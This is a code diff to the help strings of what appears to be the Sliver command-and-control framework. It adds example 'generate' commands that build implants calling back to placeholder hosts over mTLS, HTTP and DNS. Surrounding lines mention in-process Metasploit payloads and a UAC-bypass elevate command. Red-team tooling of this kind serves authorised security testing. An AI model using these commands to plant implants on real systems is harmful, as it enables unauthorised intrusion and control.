@@ -69,7 +69,28 @@ var (
 [[.Bold]]About:[[.Normal]] Switch the active sliver, a valid name must be provided (see sessions).`
 
 	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
-[[.Bold]]About:[[.Normal]] Generate a new sliver binary.`
+[[.Bold]]About:[[.Normal]] Generate a new sliver binary and saves the output to the cwd or a path specified with --save.
+
+[[.Bold]]Formats[[.Normal]]
+
+
+[[.Bold]]Command and Control[[.Normal]]
+
+1. The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
+
+	generate --mtls foo.example.com 
+
+2. You can also stack the C2 configuration with multiple protocols:
+
+	generate --os linux --mtls example.com --http foobar.com --dns 0.baz.com
+
+[[.Bold]]DNS Canaries[[.Normal]]
+
+
+[[.Bold]]Execution Limits[[.Normal]]
+Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.
+
+`
 
 	msfHelp = `[[.Bold]]Command:[[.Normal]] msf [--lhost] <options>
 [[.Bold]]About:[[.Normal]] Execute a metasploit payload in the current process.`
@@ -118,6 +139,7 @@ var (
 
 	elevateHelp = `[[.Bold]]Command:[[.Normal]] elevate
 [[.Bold]]About:[[.Normal]] Spawn a new sliver session as an elevated process (UAC bypass)`
+
 	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly <path to assembly> [arguments]
 [[.Bold]]About:[[.Normal]] Executes the .NET assembly in a child process.`
 
